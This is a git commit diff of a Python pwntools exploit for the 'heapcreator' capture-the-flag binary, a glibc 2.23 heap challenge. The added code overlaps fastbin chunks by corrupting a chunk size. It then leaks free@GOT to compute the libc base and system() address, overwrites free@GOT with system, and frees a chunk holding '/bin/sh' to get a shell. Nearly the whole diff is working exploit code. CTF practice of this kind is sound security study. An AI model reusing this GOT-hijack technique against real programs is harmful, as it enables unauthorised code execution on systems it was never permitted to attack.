b57d6e7bc7d07a6312b455b92374e5a0d7743d25
leo <hireedleo@gmail.com>
2020-12-25 06:44:26 -0800

    pwned heapcreator via fastbin chunk overlappingw

--- pwn/ctf_wiki/glibc_heap/extend_chunk/heapcrator/poc_heapcrator.py
+++ pwn/ctf_wiki/glibc_heap/extend_chunk/heapcrator/poc_heapcrator.py
@@ -9,15 +9,15 @@ def debug_on():
 
 g_fname = "./heapcreator"
 g_elf = ELF(g_fname)
-g_libcname = "./libc-2.23.so"
+g_libcname = "/glibc/2.23/64/lib/libc-2.23.so" if LOCAL else "./libc-2.23.so"
 ld_name = "/glibc/2.23/64/lib/ld-2.23.so"
 
 if (LOCAL):
 	g_io = process([ld_name, g_fname])
-	g_libc = g_elf.libc
 else:
 	g_io = remote()
-	g_libc = ELF(g_libcname)
+
+g_libc = ELF(g_libcname)
 
 def getpid():
 	if (DEBUG & LOCAL):
@@ -28,7 +28,7 @@ s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
 r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline
 
 def opt(idx):
-	sa("Your choice :", str(idx))
+	sla("Your choice :", str(idx))
 
 def create(size, content):
 	opt(1)
@@ -54,10 +54,10 @@ def pwn():
 	create(0x18, "222") # 2
 
 	getpid()
-	# 1st. modify record_0's chunk size and extend it to record_1's
-	edit(0, 'a'*0x18 + '\x61')	
+	# 1st. modify heaparray[0]'s chunk size and extend it to heaparray[1]'s
+	edit(0, "/bin/sh".ljust(0x18, '\0') + '\x61')	
 
-	# 2nd. delete record_1
+	# 2nd. delete heaparray[1]
 	delete(1)
 	
 	# 3rd. add a new record
@@ -66,10 +66,23 @@ def pwn():
 		0, 0x21, 'b'*0x18,
 		0x21, 0x18, g_elf.got["free"]
 	])
-	create(0x50, payload)
+	create(0x50, payload) # reallocate to heaparray[1]
 
 	# 4th. leak address free
 	show(2)
+	ru("Content : ")
+	data = rl()
+	log.info("received data=%s", data)
+	addr_free = u64(data[:-1].ljust(8, b'\0'))
+	libc_base = addr_free - g_libc.symbols["free"]
+	addr_system = libc_base + g_libc.symbols["system"]
+	log.success("free@%#x\nlibc@%#x\nsystem@%#x", addr_free, libc_base, addr_system)
+
+	# 5th. hijack free@got to system's address by edit heaparray[2]
+	edit(2, p64(addr_system))
+	
+	# 6th. trigger system() via invoke free
+	delete(0)
 
 if ("__main__" == __name__):
 	debug_on()
